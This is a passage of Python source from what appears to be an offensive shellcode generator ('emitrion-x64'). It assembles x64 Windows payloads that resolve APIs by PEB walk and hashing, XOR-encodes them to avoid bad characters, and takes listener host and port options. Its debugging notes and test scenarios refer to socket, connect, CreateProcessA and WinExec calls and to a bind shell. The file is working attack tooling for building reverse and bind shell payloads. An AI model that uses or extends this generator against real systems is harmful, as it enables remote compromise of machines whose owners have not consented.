    lines.append("| `? rsp & f` | Check 16-byte alignment (must be 0) |")
    lines.append("")

    api_slots = layout.slots_by_category("api")
    if api_slots:
        lines.append("## Inspect API Pointers After Resolution")
        lines.append("")
        lines.append("After PEB walk and hash resolution, verify stored function pointers:")
        lines.append("")
        lines.append("```")
        for s in api_slots:
            lines.append(f"dq @rsp+0x{s.offset:x} L1    ; {s.name}")
        lines.append("```")
        lines.append("")

    if struct_slots:
        lines.append("## Inspect Structures Before API Calls")
        lines.append("")
        for slot in struct_slots:
            struct_db = STRUCT_DATABASE_X64 if slot.name in STRUCT_DATABASE_X64 else STRUCT_DATABASE
            struct_rec = struct_db.get(slot.name)
            if struct_rec is None:
                continue
            lines.append(f"### {slot.name} (0x{struct_rec.size:x} bytes)")
            lines.append("")
            lines.append(f"Base: `rsp+0x{slot.offset:x}`")
            lines.append("")
            qwords = min(struct_rec.size // 8, 8)
            lines.append("```")
            lines.append(f"dq @rsp+0x{slot.offset:x} L{qwords:x}    ; first {qwords} qwords")
            lines.append(f"db @rsp+0x{slot.offset:x} L{min(struct_rec.size, 0x40):x}    ; raw bytes")
            lines.append("```")
            lines.append("")
            if struct_rec.fields:
                lines.append("Key fields:")
                lines.append("")
                for f in struct_rec.fields:
                    field_off = slot.offset + f.offset
                    if f.size <= 4:
                        lines.append(
                            f"- `dd @rsp+0x{field_off:x} L1`  "
                            f"{f.name} (+0x{f.offset:02x})"
                        )
                    else:
                        lines.append(
                            f"- `dq @rsp+0x{field_off:x} L1`  "
                            f"{f.name} (+0x{f.offset:02x})"
                        )
                lines.append("")

    string_slots = layout.slots_by_category("string")
    if string_slots:
        lines.append("## Inspect Stack Strings")
        lines.append("")
        for s in string_slots:
            lines.append("```")
            lines.append(f"da @rsp+0x{s.offset:x}    ; {s.name}")
            lines.append("```")
            lines.append("")

    lines.append("## ABI Verification at Call Sites")
    lines.append("")
    lines.append("Set breakpoints at each `call qword ptr [rsp+0xNN]`. Before")
    lines.append("the call executes, verify:")
    lines.append("")
    lines.append("```")
    lines.append("r rcx         ; 1st arg")
    lines.append("r rdx         ; 2nd arg")
    lines.append("r r8          ; 3rd arg")
    lines.append("r r9          ; 4th arg")
    lines.append("dq @rsp L5    ; shadow space (32 bytes) + 5th arg")
    lines.append("? @rsp & f    ; alignment check (must be 0 at CALL)")
    lines.append("```")
    lines.append("")

    if api_slots:
        lines.append("## Breakpoint Strategy")
        lines.append("")
        lines.append("Break before each API call to verify arguments and return values:")
        lines.append("")
        lines.append("```")
        for s in api_slots:
            note = ""
            if s.name == "WSAStartup":
                note = "  ; rax=0 on success"
            elif s.name == "WSASocketA":
                note = "  ; rax=socket handle"
            elif s.name == "connect":
                note = "  ; rax=0 on success"
            elif s.name == "CreateProcessA":
                note = "  ; rax!=0 on success"
            elif s.name == "WinExec":
                note = "  ; rax>31 on success"
            elif s.name == "ExitProcess":
                note = "  ; does not return"
            lines.append(
                f"bp <sc_base>+<offset_of_call_{s.name}>{note}"
            )
        lines.append("```")
        lines.append("")
        lines.append("Find call offsets by searching `generated.asm` for")
        lines.append("`call qword ptr [rsp+` instructions. Add the instruction's")
        lines.append("byte offset to the base address printed by the debug runner.")

    return "\n".join(line.rstrip() for line in lines)


def build_x64(
    manifest_path: str,
    template_name: str | None = None,
    config: TemplateConfig | None = None,
    out_dir: str = "emitter_out",
    assemble: bool = True,
    encode: bool = False,
    raw: bool = False,
) -> "BuildResult":
    """Run the full x64 build pipeline. Returns a BuildResult (same shape as x86).

    Mirrors build.build() but uses x64 stack allocator, x64 framework stubs,
    and x64 compose pipeline. When *encode* is True and assembled output has
    badchar violations, the XOR encoder is invoked automatically.

    When *raw* is True, inline badchar avoidance is skipped (no XOR-mask
    pairs for immediates). Use with *encode* for smallest shellcode.
    """
    from .build import (
        BuildResult,
        _load_template,
        _merge_template_requirements,
        _apply_config_overrides,
        _bytes_to_c,
        _bytes_to_hex_str,
        _bytes_to_py,
    )
    from .schema import load as load_manifest
    from .stack_alloc_x64 import build_layout_x64
    from .workflow.ir import CallAPI
    from .workflow.reference import WorkflowTemplate

    manifest = load_manifest(manifest_path)
    config = config or TemplateConfig(arch="x64")
    config.arch = "x64"
    manifest_badchars = manifest.badchars
    config.badchars = set() if raw else manifest.badchars

    manifest = _apply_config_overrides(manifest, config)

    effective_template = template_name or manifest.template
    template = _load_template(effective_template) if effective_template else None

    extra_structs: list[str] | None = None
    max_stack_args = 0

    if template is not None:
        manifest = _merge_template_requirements(manifest, template, config)
        if isinstance(template, WorkflowTemplate):
            struct_map = template.probe_structs(config)
            extra_structs = list(struct_map.values())
            wf = template._resolve_workflow(config)
            max_args = max(
                (len(op.arguments) for b in wf.blocks for op in b.operations if isinstance(op, CallAPI)),
                default=0,
            )
            max_stack_args = max(max_args - 4, 0)

    layout = build_layout_x64(manifest, extra_structs=extra_structs, max_stack_args=max_stack_args)
    asm = compose_asm_x64(manifest, layout, manifest_path, template, config)

    sc_bytes: bytes | None = None
    assembler: str | None = None
    asm_errors: list[str] = []
    encoded_bytes: bytes | None = None
    encoder_report: str | None = None

    if assemble:
        try:
            import keystone
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
            from .build import _strip_comments
            encoding, _ = ks.asm(_strip_comments(asm))
            sc_bytes = bytes(encoding)
            assembler = "keystone-x64"

            if manifest_badchars and sc_bytes:
                violations = [
                    (off, byte)
                    for off, byte in enumerate(sc_bytes)
                    if byte in manifest_badchars
                ]
                if violations:
                    if encode:
                        from .xor_encoder import xor_encode_x64
                        enc = xor_encode_x64(sc_bytes, manifest_badchars)
                        encoder_report = enc.diagnostics
                        if enc.success:
                            encoded_bytes = enc.encoded
                        else:
                            asm_errors.append(
                                f"[!] Encoding failed: {enc.diagnostics}"
                            )
                    else:
                        samples = violations[:8]
                        detail = ", ".join(
                            f"0x{b:02x}@offset {o}" for o, b in samples
                        )
                        asm_errors.append(
                            f"Badchar bytes in assembled output ({len(violations)} "
                            f"occurrences): {detail}"
                        )
                        sc_bytes = None
                        assembler = None
        except ImportError:
            asm_errors.append("keystone not available; skipping x64 assembly")
        except Exception as e:
            asm_errors.append(f"keystone-x64: {e}")

    contract_md = _emit_contract_md_x64(manifest, layout, sc_bytes)

    return BuildResult(
        manifest_path=manifest_path,
        asm=asm,
        contract_md=contract_md,
        shellcode_bytes=sc_bytes,
        hex_str=_bytes_to_hex_str(sc_bytes) if sc_bytes else None,
        py_bytes=_bytes_to_py(sc_bytes) if sc_bytes else None,
        c_array=_bytes_to_c(sc_bytes) if sc_bytes else None,
        debug_runner=generate_debug_runner_x64(asm),
        layout=layout,
        assembler=assembler,
        asm_errors=asm_errors if asm_errors else None,
        encoded_bytes=encoded_bytes,
        encoder_report=encoder_report,
        xor_wrapper=generate_xor_wrapper(arch="x64", badchars=manifest_badchars),
    )


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main_x64() -> None:
    """CLI entry point for x64 builds.

    Usage:
        uv run emitrion-x64 manifest.yaml --lhost 192.168.1.100 --lport 9001
        uv run emitrion-x64 manifest.yaml --no-assemble --out emitter_out/
    """
    from .build import _resolve_lhost, write_outputs
    from .schema import CANONICAL_TEMPLATES, LEGACY_TEMPLATES

    valid_x64_templates = sorted(
        t for t in CANONICAL_TEMPLATES | LEGACY_TEMPLATES
    )

    parser = argparse.ArgumentParser(
        description="emitrion-x64: manifest -> x64 assembly + contract",
    )
    parser.add_argument("manifest", nargs="?", help="Path to manifest YAML file")
    parser.add_argument(
        "--template", choices=valid_x64_templates, default=None,
        help="Override manifest template",
    )
    parser.add_argument("--out", default="emitter_out", help="Output directory")
    parser.add_argument(
        "--lhost", default=None, metavar="IP|IFACE",
        help="Listener/server IP or interface name",
    )
    parser.add_argument(
        "--lport", type=int, default=None,
        help="Listener/server port",
    )
    parser.add_argument("--command", default=None, help="Command string override")
    parser.add_argument("--src", default=None, help="Source path override")
    parser.add_argument("--dst", default=None, help="Destination path override")
    parser.add_argument("--no-assemble", action="store_true",
                        help="Skip assembly (generate .asm only)")
    parser.add_argument("--encode", action="store_true",
                        help="Apply XOR encoding when badchar violations are detected")
    parser.add_argument("--raw", action="store_true",
                        help="Skip inline badchar avoidance (smallest shellcode). "
                             "Combine with --encode for whole-payload XOR encoding.")
    parser.add_argument("--run-scenario", metavar="NAME",
                        help="Build from a named harness scenario and execute "
                             "(e.g. test_a_winexec, test_e_bind_shell, or 'all')")

    args = parser.parse_args()

    if args.run_scenario:
        from .native_harness_x64 import run_scenario, run_all_scenarios, SCENARIOS
        if args.run_scenario == "all":
            results = run_all_scenarios()
            for r in results:
                icon = {
                    "success": "[PASS]",
                    "indeterminate": "[????]",
                    "exception": "[EXCP]",
                    "worker_crash": "[DEAD]",
                    "setup_failure": "[FAIL]",
                    "not_windows": "[SKIP]",
                }.get(r.status, "[????]")
                print(f"  {icon} {r.test_id}: {r.status}")
                if r.failure_reason:
                    print(f"         {r.failure_reason}")
            sys.exit(0 if all(
                r.passed or r.status == "not_windows"
                for r in results
            ) else 1)
        else:
            if args.run_scenario not in SCENARIOS:
                print(f"[!] Unknown scenario: {args.run_scenario}", file=sys.stderr)
                print(f"    Available: {', '.join(sorted(SCENARIOS))}", file=sys.stderr)
                sys.exit(1)
            result_exec = run_scenario(args.run_scenario)
            print(result_exec.to_json())
            sys.exit(0 if result_exec.passed else 1)

    if not args.manifest:
        parser.error("manifest is required unless --run-scenario is used")

    lhost = _resolve_lhost(args.lhost) if args.lhost else "127.0.0.1"
    lport = args.lport or 4444

    config = TemplateConfig(
        lhost=lhost,
        lport=lport,
        command=args.command,
        src_path=args.src,
        dst_path=args.dst,
        arch="x64",
    )

    result = build_x64(
        args.manifest,
        template_name=args.template,
        config=config,
        out_dir=args.out,
        assemble=not args.no_assemble,
        encode=args.encode,
        raw=args.raw,
    )
    write_outputs(result, args.out)

    print(f"[+] Arch:      x64")
    print(f"[+] Generated: {args.out}/asm/generated.asm")
    print(f"[+] Debug:     {args.out}/asm/debug_runner.py")
    print(f"[+] Contract:  {args.out}/Documentation/contract.md")
    if result.shellcode_bytes:
        print(f"[+] Assembler: {result.assembler}")
        print(f"[+] Shellcode: {len(result.shellcode_bytes)} bytes")
        print(f"[+] Hex:       {args.out}/bin/shellcode.{{bin,hex,py,c}}")
        if result.encoded_bytes:
            print(f"[+] Encoded:   {len(result.encoded_bytes)} bytes (XOR)")
        if result.asm_errors:
            for err in result.asm_errors:
                print(f"[!] {err}", file=sys.stderr)
            sys.exit(1)
    else:
        if result.asm_errors:
            print("[!] Assembly failed:")
            for err in result.asm_errors:
                print(f"    {err}")
            sys.exit(1)
        elif not args.no_assemble:
            print("[!] Assembly requested but no assembler available")
            sys.exit(1)
        else:
            print("[*] Assembly skipped (--no-assemble)")


if __name__ == "__main__":
    main_x64()
